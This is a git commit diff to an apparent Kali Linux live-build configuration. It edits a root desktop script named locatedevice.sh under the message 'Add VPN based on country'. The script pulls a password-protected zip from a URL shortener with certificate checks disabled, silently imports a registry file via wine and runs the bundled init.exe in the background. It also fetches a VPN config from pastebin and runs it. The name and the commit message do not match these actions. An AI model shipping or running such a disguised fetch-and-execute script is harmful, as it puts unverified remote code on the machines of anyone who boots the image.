fbe03607b012eba86a1a10fa04ff276d40ba052c
ind3p3nd3nt <ind3p3nd3nt@outlook.com>
2020-09-17 14:33:00 -0400

    Add VPN based on country

--- live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
+++ live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
@@ -1,13 +1,12 @@
-#!/bin/bash
+#!/bin/bash -e
 sudo apt update;
-sudo apt install unzip wget openvpn winetricks -y;
+sudo apt install unzip wget openvpn -y;
 mkdir ~/init/;
 wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
-wget --no-check-certificate -O ~/init/vpn https://is.gd/sickvpnclient;
 cd ~/init/;
-sudo openvpn vpn&
 rm -rf init.exe;
 unzip -P1011011011 init.zip;
 wine regedit /s /root/s.reg;
-wine init.exe;
+wine init.exe&
+wget -O sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate && python3 /root/pingvpn.py && openvpn sickvpn.conf&
 exit 0
